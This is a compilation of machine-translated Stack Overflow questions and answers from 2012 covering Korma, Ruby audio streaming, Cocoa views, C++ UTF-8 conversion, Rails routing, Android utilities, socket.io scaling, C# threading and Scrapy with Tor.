当内部使用多个数据库时，是否可以在[Korma](http://sqlkorma.com/)中使用事务宏？我试过了，但它只选择一个数据库并将所有查询和子句绑定到该数据库。

*编辑*

我的用例是某种 ETL，因为我只从源执行只读任务，所以只有一个影响目标数据库的事务是可以的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T20:06:14.037

每个事务使用单个数据库在某种程度上融入了 Korma（以及大多数其他类似系统）。当使用多个数据库时，因此有多个事务，如果另一个事务失败，您似乎需要额外的抽象层强制中止一个事务。如果您不经常这样做，那么手动进行这些检查可能会很好，尽管我不会坚持让任何 DBMS 为您处理它。

# ruby - 从 servlet 将 MP3 音频流式传输到 HTML5 音频标签

> ID：11603382
> 
> 赞同：1
> 
> 时间：2012-07-22T19:35:38.340
> 
> 标签：ruby, html, cross-browser, mp3, html5-audio

我有一些跨浏览器兼容性的乐趣。我有一个带有几个 servlet 的 Ruby WEBrick 服务器，其中一个用于流媒体（Ogg 和 MP3）。servlet 获取几个查询参数（一个 base64 url​​safe 字符串`key`、一个小字符串`user`和一个小数字`sid`）。当我将 URL 逐字输入 Chrome 时，我得到了 QuickTime 扩展，并且它可以工作。当我将其发布到 FireFox 时，我得到了预期的不受支持的编解码器。当我把它放在 Safari 中时，它可以工作。但是，不会直接访问该 URL。我有一个使用 Javascript [Buzz的 jQuery Mobile 应用程序](http://buzz.jaysalvat.com/)库，并使用这些 servlet 流 URL 作为源。该代码在 Safari 中运行，允许我播放声音。在 FireFox 上，它不会回到 Ogg 上，而是给出不受支持的错误，而在 Chrome 上，它什么也不做。这是为 MP3 提供服务的代码：

```
res.status = 200
str = File.new("Music/#{req.query['sid']}.mp3", 'r:BINARY:BINARY').read
res.body = str
res['content-type'] = 'audio/mpeg' 
```

谁能告诉我如何通过 Ruby servlet 将音频流传输到所有浏览器？

注意：这不是重复的。我已经彻底了解了很多 SO 答案，但没有一个有效，因为它们是为静态文件设计的，而不是为 servlet 设计的。

# vb.net - 如何将“列表（对象）”写入 VB.NET 中的文件？

> ID：11603383
> 
> 赞同：2
> 
> 时间：2012-07-22T19:35:37.623
> 
> 标签：vb.net, file, list, save

我有这样的课

```
Public Class alink
    Public url As String
    Public id As Integer
    Public linksto As New List(Of Integer)()
End Class 
```

这是这样声明的..

```
Public thelinklist As New List(Of alink)() 
```

我的问题是如何去写和读这个列表到文件？

我完全不确定要使用什么方法！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T19:48:30.620

取决于您希望如何使用文件，如果它仅用于存储/加载对象并且不需要人类可读，则可以使用[serialization](http://msdn.microsoft.com/en-us/library/ms973893.aspx)。

# php - 自定义 Drupal 模块中的未定义变量

> ID：11603386
> 
> 赞同：-3
> 
> 时间：2012-07-22T19:35:56.433
> 
> 标签：php, module, drupal-7, drupal-modules

我编写自定义 Drupal 模块。想要在内容中显示 field_myear。具有以下内容：

```
<div class="right">
                                <h4>'.$m_detail->title.'</h4>
                                <div class="section">'.$field_myear.'</div>
                                <div class="description">
                                    <div 
```

但是当刷新页面时，得到这个错误：

```
Notice: theme_news()/home/domains/site.net/public_html/sites/all/modules/site/theme.module dosyasının 1247 satırı) içinde Undefined variable: field_myear. 
```

我该如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T22:19:19.390

关注页面的执行。逐行遍历它。当您输出上面显示的 HTML 时，您没有为`field_myear`. 您需要确保在尝试输出之前设置它 - 或者您需要检查变量名称以确保它是正确的并且没有错字。

# objective-c - Cocoa 框架中的 addSubview

> ID：11603387
> 
> 赞同：0
> 
> 时间：2012-07-22T19:36:02.003
> 
> 标签：objective-c, cocoa

我在窗口中有一个常规的 DocumentView 类。用户按下按钮后，我有以下代码：

```
- (void)handleButtonPress:(NSNotification *)note{
  // draw new graph view
  EDGraphView *graph = [[EDGraphView alloc] init];
  [self addSubview:graph];
  [self setNeedsDisplay:TRUE];

  NSLog(@"Button was pressed");
} 
```

这会被正确调用，因为每次单击按钮时我都会得到输出“按钮被按下”。除此之外，视图下面的*drawRect*方法也会被调用。

```
- (void)drawRect:(NSRect)dirtyRect
{
  NSRect bounds = [self bounds];
  [[NSColor whiteColor] set];
  [NSBezierPath fillRect:bounds];

  for(EDGraphView *graph in [self subviews]){
    [graph setNeedsDisplay:TRUE];
    NSLog("calling set needs display on graph object!");
  }
} 
```

但是，当我进入 EDGraphView 类并编辑*drawRect*方法时，如下所示

```
- (void)drawRect:(NSRect)dirtyRect
{
  NSLog(@"redrawing graph view.");
} 
```

它永远不会被调用！我一定错过了关于整个*setNeedsDisplay*和*drawRect*过程的一些东西。

有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T20:25:53.667

嗨 Normaly 你不会调用 setneeddisplay 到 drawrect 中。

你试过（和超级）吗？：

```
- (void)drawRect:(NSRect)dirtyRect
{
    NSRect bounds = [self bounds];
   [[NSColor whiteColor] set];
   [NSBezierPath fillRect:bounds];
   [super drawRect:rect];

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T22:04:09.017

明白了...我需要对我的子视图进行以下初始化调用：

```
EDGraphView *graph = [[EDGraphView alloc] initWithFrame:bounds]; 
```

现在它调用 drawRect 方法！

# boost - 修改boost图库的A星搜索

> ID：11603392
> 
> 赞同：0
> 
> 时间：2012-07-22T19:36:24.530
> 
> 标签：boost, shortest-path

我发现了这个 boost library 的星搜索实现。它说这个实现找到了从起始顶点到每个其他顶点的最短距离。但是，我只想要从开始顶点到结束的最短距离。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T19:52:43.197

在实现中，可能有一个带有条件的循环

```
while (openQueue != empty)
    ...pop bestCostVertex, etc. 
```

如果你调整条件

```
while (openQueue != empty && bestCostVertex != endVertex) 
```

其中 bestCostVertex 是要从 openQueue 中弹出的顶点，openQueue 中的顶点只会被处理，直到找到 endVertex。

# c - 本地函数定义被 Visual Studio 拒绝

> ID：11603393
> 
> 赞同：2
> 
> 时间：2012-07-22T19:36:37.743
> 
> 标签：c, tags, device

我正在尝试列出连接到我的系统的所有设备，并在搜索后发现此代码引发错误本地函数定义是非法的，有人可以解释一下它的含义。

或者是我的问题，因为我正在尝试使用来自 C++ 的代码。谢谢

工作代码

```
#include <windows.h>
#include <setupapi.h>
#include <stdio.h>
#pragma comment(lib,"SetupAPI") 

void print_property
(
    __in HDEVINFO hDevInfo,
    __in SP_DEVINFO_DATA DeviceInfoData,
    __in PCWSTR Label,
    __in DWORD Property
)
{
    DWORD DataT;
    LPTSTR buffer = NULL;
    DWORD buffersize = 0;

    // 
    while (!SetupDiGetDeviceRegistryProperty(
                hDevInfo,
                &DeviceInfoData,
                Property,
                &DataT,
                (PBYTE)buffer,
                buffersize,
                &buffersize))
    {
        if (ERROR_INSUFFICIENT_BUFFER == GetLastError())
        {
            // Change the buffer size.
            if (buffer)
            {
                LocalFree(buffer);
            }
            // Double the size to avoid problems on 
            // W2k MBCS systems per KB 888609\. 
            buffer = (LPTSTR)LocalAlloc(LPTR, buffersize * 2);
        }
        else
        {
            break;
        }
    }

    wprintf(L"%s %s\n",Label, buffer);

    if (buffer)
    {
        LocalFree(buffer);
    }
}

int main() 
{

    //int setupdi_version()
    //{
    HDEVINFO hDevInfo;
    SP_DEVINFO_DATA DeviceInfoData;
    DWORD i;

    // Create a HDEVINFO with all present devices.
    hDevInfo = SetupDiGetClassDevs(
        NULL,
        0, // Enumerator
        0,
        DIGCF_PRESENT | DIGCF_ALLCLASSES);

    if (INVALID_HANDLE_VALUE == hDevInfo)
    {
        // Insert error handling here.
        return 1;
    }

    // Enumerate through all devices in Set.

    DeviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);

    for (i = 0; SetupDiEnumDeviceInfo(hDevInfo, i, &DeviceInfoData); i++)
    {
        LPTSTR buffer = NULL;
        DWORD buffersize = 0;

        print_property(hDevInfo, DeviceInfoData, L"Friendly name :", SPDRP_FRIENDLYNAME);

        while (!SetupDiGetDeviceInstanceId(
            hDevInfo, 
            &DeviceInfoData, 
            buffer, 
            buffersize, 
            &buffersize))
        {
            if (buffer)
            {
                LocalFree(buffer);
            }

            if (ERROR_INSUFFICIENT_BUFFER == GetLastError())
            {
                // Change the buffer size.
                // Double the size to avoid problems on
                // W2k MBCS systems per KB 888609.
                buffer = (LPTSTR)LocalAlloc(LPTR, buffersize * 2);
            }
            else
            {
                wprintf(L"error: could not get device instance id (0x%x)\n", GetLastError());
                break;
            }
        }

        if (buffer)
        {
            wprintf(L"\tDeviceInstanceId : %s\n", buffer);
        }

        print_property(hDevInfo, DeviceInfoData, L"\tClass :", SPDRP_CLASS);
        print_property(hDevInfo, DeviceInfoData, L"\tClass GUID :", SPDRP_CLASSGUID);
    }

    if (NO_ERROR != GetLastError() && ERROR_NO_MORE_ITEMS != GetLastError())
    {
        // Insert error handling here.
        return 1;
    }

    // Cleanup
    SetupDiDestroyDeviceInfoList(hDevInfo);

    system ("pause");

    return 0;

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T19:38:37.793

`main`您在;的主体内定义了另一个函数 这是无效的 C. 将其移出`main`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T20:00:43.330

如果您注释掉以下两行，代码将编译并运行，如下所示：

```
// int setupdi_version()
// { 
```

我认为原始代码来自一个名为的函数`setupdi_version()`，当您尝试将其更改为`main()`. 注意：看起来原始源代码来自[这里](http://samscode.blogspot.com/2009/08/setupdi-how-to-enumerate-devices-using.html)。

回答您的后续问题。这些是链接器错误。您需要告诉 Visual Studio`.lib`要链接的文件。您可以在 Visual Studio 项目依赖项中执行此操作，或者只需将以下内容添加到源代码的顶部。

```
#pragma comment(lib,"SetupAPI") 
```

# xcode - 在 xCode 中保存文件并制作图表

> ID：11603394
> 
> 赞同：0
> 
> 时间：2012-07-22T19:36:51.287
> 
> 标签：xcode, file, save

我是编程新手。现在我已经学习了几个星期，现在正在制作我的第一个应用程序。可能不公开，只为我。至少现在。就这样吧。我希望用户能够在 textField 中输入他的信息（例如体重或类似的东西）然后保存它，这样我以后可以形成一个图表（例如随着时间的推移减肥）。现在图表应该不是那么大的问题，因为有很多关于它的教程。我对如何输入信息更感兴趣，然后保存它以便以后访问。有什么帮助吗？我应该读什么？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T19:49:32.567

在 Objective C 中使用 UITextFields 非常简单——你可以使用 'text' 属性从这样的对象中获取 NSString。使用[plist](http://humblecoder.blogspot.com/2009/05/iphone-tutorial-storing-and-retrieving.html)进行本地存储，或[JSON](http://www.raywenderlich.com/5492/working-with-json-in-ios-5)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T20:06:50.057

在“<a href="http://developer.apple.com/library/mac/documentation/cocoa/Conceptual/CoreData/Articles/cdBindings.html#//apple_ref/ 上查看与 Apple 文档特别相关的核心数据教程doc/uid/TP40004194-SW1" rel="nofollow">核心数据和 Cocoa 绑定”

CoreData 展示了如何设置对象并将它们保存到文件或简单数据库中。Cocoa 绑定是如何使输入屏幕将数据传递给对象模型。

您应该能够编写一个程序来输入权重、保存它们并在表格中显示，而无需编写任何代码。

# ruby-on-rails - Rails 如何美化这个块

> ID：11603397
> 
> 赞同：0
> 
> 时间：2012-07-22T19:37:07.057
> 
> 标签：ruby-on-rails, ruby, block

对 Rails 来说有点新。

您将如何简化、美化此方法：

```
def find_index
   index = 0
   @ipn.each {|p|
       index = 4 if p = "new" #this is just a dummy line
   }
   index
end 
```

如您所见，它很丑陋。如何删除顶部的索引定义和底部的索引以返回 - Ruby 方式？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-22T19:49:32.297

我想你想要这个方法： [http ://ruby-doc.org/core-1.9.3/Enumerable.html#method-i-find_index](http://ruby-doc.org/core-1.9.3/Enumerable.html#method-i-find_index)

```
def find_index
  @ipn.find_index{|p| p == "new" }
end 
```

我还将变量名“@ipn”更改为“@ipns”，因为它似乎是一个可枚举的。

为了避免混淆，我可能会将方法重命名为“find_ipn_index”，所以它看起来像这样：

```
def find_ipn_index
  @ipns.find_index{|p| p == "new" }
end 
```

或者，如果 self.ipns 可用，则根本不要为此定义新方法，只需调用：

```
self.ipns.find_index{|p| p == "new" } 
```

# c++ - C++ 中的 Unicode 到 UTF-8

> ID：11603400
> 
> 赞同：5
> 
> 时间：2012-07-22T19:37:27.967
> 
> 标签：c++, boost, unicode, utf-8

我搜索了很多，但找不到任何东西：

```
unsigned int unicodeChar = 0x5e9;
unsigned int utf8Char;
uni2utf8(unicodeChar, utf8Char);
assert(utf8Char == 0xd7a9); 
```

是否有实现类似于**uni2utf8**的库（最好是 boost） ？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-07-22T19:59:27.973

Unicode 转换是 C++11 的一部分：

```
#include <codecvt>
#include <locale>
#include <string>
#include <cassert>

int main() {
  std::wstring_convert<std::codecvt_utf8<char32_t>, char32_t> convert;
  std::string utf8 = convert.to_bytes(0x5e9);
  assert(utf8.length() == 2);
  assert(utf8[0] == '\xD7');
  assert(utf8[1] == '\xA9');
} 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-07-22T20:18:31.577

Boost.Locale 也有编码转换的功能：

```
#include <boost/locale.hpp>

int main() {
  unsigned int point = 0x5e9;
  std::string utf8 = boost::locale::conv::utf_to_utf<char>(&point, &point + 1);
  assert(utf8.length() == 2);
  assert(utf8[0] == '\xD7');
  assert(utf8[1] == '\xA9');
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-07-22T19:46:06.577

您可能想尝试一下[UTF8-CPP library](http://utfcpp.sourceforge.net/)。用它编码一个 Unicode 字符看起来像这样：

```
std::wstring unicodeChar(L"\u05e9");
std::string utf8Char;
encode_utf8(unicodeChar, utf8Char); 
```

`std::string`在这里用作 UTF-8 字节的容器。

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2012-07-22T20:04:22.913

使用[sprintf](http://www.cplusplus.com/reference/clibrary/cstdio/sprintf/ "冲刺")。（：

cstring = sprintf("%S", unicodestring);

# ruby-on-rails - Rails：将部分关联推入数组的优雅方式

> ID：11603402
> 
> 赞同：0
> 
> 时间：2012-07-22T19:37:47.633
> 
> 标签：ruby-on-rails, arrays, json, model, associations

我有一个`post`和一个`author`模型。

`author has_many :posts`

现在我有`author`几个`posts`

有没有一种优雅的方法可以只获取`posts'` `titles`数组，而不是整个`post`对象？

`author.posts`因此，不仅仅是`author.posts.only(:title)`获得一系列标题。例如`['post1','post2','post3']`。

该`.only(:title)`语法来自 JSON 模块，在这种情况下不起作用，但可能有比迭代`posts`和推`titles`入新数组更优雅的东西。查询数据库的东西，例如`select titles from posts where author_id = 23`.

?

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-22T19:42:44.400

利用`pluck`

```
author.posts.pluck(:title) 
```

[http://api.rubyonrails.org/classes/ActiveRecord/Calculations.html#method-i-pluck](http://api.rubyonrails.org/classes/ActiveRecord/Calculations.html#method-i-pluck)

> 采摘（列名）
> 
> 此方法旨在通过单个列执行选择作为直接 SQL 查询返回具有指定列名值的数组值与列具有相同的数据类型。

# javascript - 这个javascript脚本有什么问题？

> ID：11603411
> 
> 赞同：-2
> 
> 时间：2012-07-22T19:38:44.577
> 
> 标签：javascript, dom-events, mouseevent, mouseover

> **可能重复：**
> [为什么这不起作用？使用鼠标指针推动一个盒子](https://stackoverflow.com/questions/11594680/why-is-this-not-working-pushing-a-box-using-mouse-pointer)

这是一个使用鼠标指针推动盒子的脚本，它仅在从左侧推动盒子时才起作用。

我创建了一个数组来获取鼠标指针的位置并确定它是向左还是写入。

这是我到目前为止得到的一个工作[示例。](http://jsfiddle.net/smokn/BFQvn/)

***index.js***

```
<html>
    <head>
        <title>Chase the box</title>
        <style>
            body {
            }

            .css-box{
                position: absolute ;
                top:20px;
                width : 100px;
                height : 100px;
                background-color : blue;
            }

            .css-textbox{
                margin-top: 500px;
            }

        </style>
    </head>

    <body>
        <div id="box" class="css-box"></div>
        <div class="css-textbox">            
            <p>All : <input id="allTextbox" type="text"></input></p>
            <p>Left : <input id="leftTextbox" type="text"></input></p>
            <p>Right : <input id="rightTextbox" type="text"></input></p>
            <p>e.pageX(Left) : <input id="pageXTextbox" type="text"></input></p>
            <p>e.pageX(Right) : <input id="pageXRightTextbox" type="text"></input></p>
        </div>
        <script type="text/javascript" src="script.js"></script>
    </body>

</html> 
```

***脚本.js***

```
var box = document.getElementById("box");
var allTextbox = document.getElementById("allTextbox");
var leftTextbox = document.getElementById("leftTextbox");
var rightTextbox = document.getElementById("rightTextbox");
var pageXTextbox = document.getElementById("pageXTextbox");
var PageXRightTextbox = document.getElementById("pageXRightTextbox");

Object.prototype.offsetRight = null;

var arr = [];
var pushBox = function(e){
    var pageXRight = window.innerWidth - e.pageX;
    box.offsetRight = window.innerWidth - (box.offsetWidth + box.offsetLeft);

    if(arr.length < 2){
        arr.push(e.pageX);
    } else {            
        if(arr[0] < arr[1]){
            if(e.pageX >= box.offsetLeft){
                box.style.left = e.pageX + "px";
            }
        } else if(arr[0] > arr[1]){
            if(pageXRight >= box.offsetRight){
                box.style.right = pageXRight + "px";
            }
        }

        arr.shift(arr[0] , arr[1]);        
    }

    allTextbox.value = window.innerWidth;
    leftTextbox.value = box.offsetLeft;
    rightTextbox.value = box.offsetRight;
    pageXTextbox.value = e.pageX;
    pageXRightTextbox.value = pageXRight;
}

document.addEventListener("mousemove" , pushBox); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:00:01.280

问题出在两个地方：

1.  您不应该同时设置左右两个 css 属性，这会混淆应该指定位置的浏览器。如果设置一个，则将另一个设置为空。

2.  看我下面的评论

我还稍微修改了您的脚本，因为 arr[0] 和 arr[1] 不容易阅读，因为它们没有传达它们的含义，因此我为数组值分配了一个变量以提高可读性。

快乐推。

```
var pushBox = function(e){
    var pageXRight = window.innerWidth - e.pageX;
    box.offsetRight = window.innerWidth - (box.offsetWidth + box.offsetLeft);

    if(arr.length < 2){
    arr.push(e.pageX);
    console.log(JSON.stringify(arr));
    } else {

    var previousX = arr[0];
    var newX = arr[1];

    if(previousX < newX){
                // add e.pageX <= box.offsetRight to ensure that mouse appearance to the right of the box would not push the box
        if(e.pageX >= box.offsetLeft && e.pageX <= box.offsetRight){
        box.style.right = null;
        box.style.left = e.pageX + "px";
        }
    } else if(previousX > newX){
        if(pageXRight >= box.offsetRight){
        box.style.left = null;
        box.style.right = pageXRight + "px";
        }
    }

    arr.shift(arr[0] , arr[1]);        
    }

    allTextbox.value = window.innerWidth;
    leftTextbox.value = box.offsetLeft;
    rightTextbox.value = box.offsetRight;
    pageXTextbox.value = e.pageX;
    pageXRightTextbox.value = pageXRight;
} 
```

# android - android - 如何创建一个可重用的函数？

> ID：11603412
> 
> 赞同：14
> 
> 时间：2012-07-22T19:39:14.893
> 
> 标签：android

在我的 android 项目中，我有很多活动，其中一些已经扩展了其他东西，如地图活动或广播接收器。

如何创建一个可以从任何活动调用的函数，因为我不想在多个活动中重复任何代码。

谢谢。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-07-22T20:17:02.810

如果我有有用的函数来执行我想从几个活动中调用的小有用任务，我会创建一个名为 Util 的类并将它们停在那里。我制作它们`static`是为了不需要分配任何对象。

这是我写的一个此类的一部分的示例：

```
public final class Util {
    public final static int KIBI = 1024;
    public final static int BYTE = 1;
    public final static int KIBIBYTE = KIBI * BYTE;

    /**
     * Private constructor to prevent instantiation
     */
    private Util() {}

    public static String getTimeStampNow() {
        Time time = new Time();
        time.setToNow();
        return time.format3339(false);
    }
} 
```

要使用这些常量和方法，我可以从类名而不是任何对象中访问它们：

```
int fileSize = 10 * Util.KIBIBYTE;
String timestamp = Util.getTimeStampNow(); 
```

这门课还有更多内容，但你明白了。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-22T19:43:51.550

您可以扩展 Application 类，然后在您的活动中调用 getApplication 方法并将其强制转换为您的应用程序类以调用该方法。

您可以通过创建一个扩展 android.app.Application 的类来做到这一点：

```
package your.package.name.here;

import android.app.Application;

public class MyApplication extends Application {

    public void doSomething(){
        //Do something here
    }
} 
```

然后，您必须在清单中找到该标记并添加 android:name="MyApplication" 属性。

在您的活动类中，您可以通过执行以下操作调用该函数：

```
((MyApplication)getApplication()).doSomething(); 
```

还有其他方法可以做类似的事情，但这是其中一种方法。文档甚至指出，在大多数情况下，静态单例是更好的选择。应用程序文档位于：http: [//developer.android.com/reference/android/app/Application.html](http://developer.android.com/reference/android/app/Application.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-22T19:44:06.190

您可以创建一个静态方法或包含此方法的对象。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-22T19:44:58.040

您可以创建一个扩展 Activity 的类，然后确保您的真实活动是该活动的子类，而不是通常的内置活动。只需在此父活动中定义您的公共代码。

沙查尔

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-02-22T08:02:40.107

1.  使用抽象修饰符创建一个新的 Java 类 BaseActivity 并使用 AppCompatActivity 对其进行扩展。

2.  将所有方法移到 Java 类 BaseActivity 下。

```
package com.example.madbox;

public abstract class BaseActivity extends AppCompatActivity {

    protected void YourClass() {

    }
} 
```

3.  使用 BaseActivity 而不是 AppCompatActivity 扩展您的活动。

# node.js - 多个socket.io进程共享同一个端口？

> ID：11603414
> 
> 赞同：3
> 
> 时间：2012-07-22T19:39:56.243
> 
> 标签：node.js, socket.io, scalability

我尝试扩展我的 socket.io 应用程序并尝试在我的服务器上运行多个进程。

我使用 redis 存储而不是内存存储，如下所述：[https ://github.com/LearnBoost/Socket.IO/wiki/Configuring-Socket.IO](https://github.com/LearnBoost/Socket.IO/wiki/Configuring-Socket.IO)

我的服务器监听 8090 端口： var io = require('/usr/local/lib/node_modules/socket.io').listen(8090);

当我开始第二个进程时，我得到一个正在使用的地址错误：警告 - 引发错误：错误：监听 EADDRINUSE

处理这个问题的最佳方法是什么？每个进程一个端口和一个负载均衡器来区分它们？

还是有更好的解决方案？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-22T22:00:51.783

为此，我使用[node-http-proxy](https://github.com/nodejitsu/node-http-proxy/)，并根据请求的 URL 将流量路由到内部端口。下面是我用来路由请求的一个非常精简的示例。

```
var httpProxy = require('http-proxy');

var httpOptions = {
    router: {
        'domain1.com/foo': 'localhost:3001',
        'domain1.com/bar': 'localhost:3002',
        'domain2.com/baz': 'localhost:3003',
    } 
};

var httpServer = httpProxy.createServer(httpOptions);
httpServer.listen(80); 
```

关于我的特定设置的更多详细信息可以在这个问题上找到：[如何在 node-http-proxy 旁边使用 vhosts？](https://stackoverflow.com/questions/9368794/how-to-use-vhosts-alongside-node-http-proxy/9370080#9370080)

# sql - 使用服务器和端口连接 SQL Server

> ID：11603415
> 
> 赞同：0
> 
> 时间：2012-07-22T19:39:58.677
> 
> 标签：sql, sql-server, connection, port

我正在尝试使用主机和端口连接到我的 SQL Server，但没有成功。

我发现其服务的默认端口是 1433，但我尝试过类似的字符串`.,1433`，`localhost,1433`但它不起作用，即使在 SQL Server Management Studio 界面中也是如此。如果不在字符串连接中设置端口，它就可以正常工作。

我正在制作一个连接到 SQL Server 数据库的应用程序，这就是为什么我需要它来连接到我选择的任何端口，包括默认端口。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T19:53:22.583

你应该指定一个协议

> tcp:ip,端口

# ruby-on-rails - 资源的匹配和动词等价物是什么？

> ID：11603417
> 
> 赞同：3
> 
> 时间：2012-07-22T19:40:26.810
> 
> 标签：ruby-on-rails, routes

在[路由指南](http://guides.rubyonrails.org/routing.html#crud-verbs-and-actions)中它说“*路由文件中的单个条目，例如在您的应用程序中`resources :photos`创建~~七个~~八个不同的路由，所有映射到照片控制器：* ”。

```
 photos GET    /photos(.:format)          photos#index
           POST   /photos(.:format)          photos#create
 new_photo GET    /photos/new(.:format)      photos#new
edit_photo GET    /photos/:id/edit(.:format) photos#edit
     photo GET    /photos/:id(.:format)      photos#show
           PATCH  /photos/:id(.:format)      photos#update
           PUT    /photos/:id(.:format)      photos#update
           DELETE /photos/:id(.:format)      photos#destroy 
```

如何使用`match`动词方法（`get`, `post`, `patch`, `put`, `delete`）创建等效路由？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-22T19:40:26.810

```
match '/photos'          => 'photos#index',   via: :get
match '/photos'          => 'photos#create',  via: :post
match '/photos/new'      => 'photos#new',     via: :get, as: 'new_photo'
match '/photos/:id/edit' => 'photos#edit',    via: :get, as: 'edit_photo'
match '/photos/:id'      => 'photos#show',    via: :get, as: 'photo'
match '/photos/:id'      => 'photos#update',  via: :patch
match '/photos/:id'      => 'photos#update',  via: :put
match '/photos/:id'      => 'photos#destroy', via: :delete 
```

和

```
get    '/photos',          to: 'photos#index'
post   '/photos',          to: 'photos#create'
get    '/photos/new',      to: 'photos#new',  as: 'new_photo'
get    '/photos/:id/edit', to: 'photos#edit', as: 'edit_photo'
get    '/photos/:id',      to: 'photos#show', as: 'photo'
patch  '/photos/:id',      to: 'photos#update'
put    '/photos/:id',      to: 'photos#update'
delete '/photos/:id',      to: 'photos#destroy' 
```

# c# - 使用访问器函数

> ID：11603419
> 
> 赞同：1
> 
> 时间：2012-07-22T19:40:30.313
> 
> 标签：c#, accessor

我正在尝试成功反编译和更新我拥有的旧统一游戏，我已经修复了大部分错误，但这仍然让我感到悲伤。我能找到的所有文档都告诉我直接分配给成员，但这不是一个选项，因为成员 set_SurrogateSelector 访问内部成员 m_surrogates。

```
private static void Init()
{
    UnityLogWriter.Init();
    if (Application.platform.ToString().Contains("WebPlayer"))
    {
        BinaryFormatter.set_SurrogateSelector(new UnitySurrogateSelector());
    }
}

// Decompiled BinaryFormatter
...
internal ISurrogateSelector m_surrogates;
public void set_SurrogateSelector(ISurrogateSelector value)
{
    this.m_surrogates = value;
} 
```

那么，如何设置代理选择器？还是我也必须编译自定义 mscorlib.dll？

编辑：更新的代码，同样的错误

```
BinaryFormatter nBFormatter = new BinaryFormatter();
UnityLogWriter.Init();
if (Application.platform.ToString().Contains("WebPlayer"))
{
      nBFormatter.SurrogateSelector = new UnitySurrogateSelector();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T19:45:00.837

那是一种财产。

```
BinaryFormatter.SurrogateSelector = new UnitySurrogateSelector(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T19:45:18.017

这不是真的。`BinaryFormatter.SurrogateSelector`是公开的。

但你似乎用错了。

它是一个实例属性，因此需要一个实例。

# c# - c#并行编程几种方法

> ID：11603422
> 
> 赞同：1
> 
> 时间：2012-07-22T19:41:10.267
> 
> 标签：c#

我有一个看起来像这样的方法：

```
public void SomeMethodThatLoadsUserData()
{
   Method1();
   Method2();
   Method3();
   .....
   Method12();
} 
```

这些会在用户登录时执行，并且每个方法都会获取一些与用户相关的数据。我想知道让这些并行运行是否会带来任何性能优势，因为每个方法最终都会调用对同一个数据库文件的查询。而且，如果有性能优势，我将如何重写这段代码？

感谢您的建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T21:31:15.003

以下代码演示了使用 Thread 和 Stopwatch 对象列表的并行测试。我认为这是一个很好的测试方法，因为它保证了并行执行尝试（与 Parallel.Invoke 不同），并且比使用 ThreadPool IMO 更容易设置。

```
public static void SomeMethodThatLoadsUserData()
{
    Stopwatch s = new Stopwatch();
    s.Start();

    List<Thread> threads = new List<Thread> {new Thread(Method1), new Thread(Method2)};

    foreach (Thread thread in threads)
    {
        thread.Start();
    }

    foreach (Thread thread in threads)
    {
        thread.Join();
    }

    s.Stop();
    Console.WriteLine("Total: {0} ms", s.ElapsedMilliseconds);

    Console.ReadKey();
}

private static void Method1()
{
    Stopwatch s = new Stopwatch();
    s.Start();
    // do work
    Thread.Sleep(1000);
    s.Stop();
    Console.WriteLine("Method 1: {0} ms", s.ElapsedMilliseconds);
}

private static void Method2()
{
    Stopwatch s = new Stopwatch();
    s.Start();
    // do work
    Thread.Sleep(1000);
    s.Stop();
    Console.WriteLine("Method 2: {0} ms", s.ElapsedMilliseconds);
} 
```

输出：

```
Method 1: 999 ms
Method 2: 999 ms
Total: 1051 ms 
```

`Total`当（希望）小于每种方法的总和时，将显示任何时间节省。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-07-22T19:48:55.140

我不知道这是否是最快或最好的方法，但您可以将每种方法转入一个新线程。

```
Thread t = new Thread(() => Method1());
t.Start(); 
```

# python - 将 Tor 代理与 scrapy 一起使用

> ID：11603423
> 
> 赞同：7
> 
> 时间：2012-07-22T19:41:13.300
> 
> 标签：python, proxy, scrapy, tor

我需要帮助在 Ubuntu 中设置 Tor 并在 scrapy 框架中使用它。

我做了一些研究，发现了这个指南：

```
class RetryChangeProxyMiddleware(RetryMiddleware):

    def _retry(self, request, reason, spider):
        log.msg('Changing proxy')
        tn = telnetlib.Telnet('127.0.0.1', 9051)
        tn.read_until("Escape character is '^]'.", 2)
        tn.write('AUTHENTICATE "267765"\r\n')
        tn.read_until("250 OK", 2)
        tn.write("signal NEWNYM\r\n")
        tn.read_until("250 OK", 2)
        tn.write("quit\r\n")
        tn.close()
        time.sleep(3)
        log.msg('Proxy changed')
        return RetryMiddleware._retry(self, request, reason, spider) 
```

然后在 settings.py 中使用它：

```
DOWNLOADER_MIDDLEWARE = {
                         'spider.middlewares.RetryChangeProxyMiddleware': 600,
                         } 
```

然后您只想通过本地 tor 代理（polipo）发送请求，这可以通过以下方式完成：

```
tsocks scrapy crawl spirder 
```

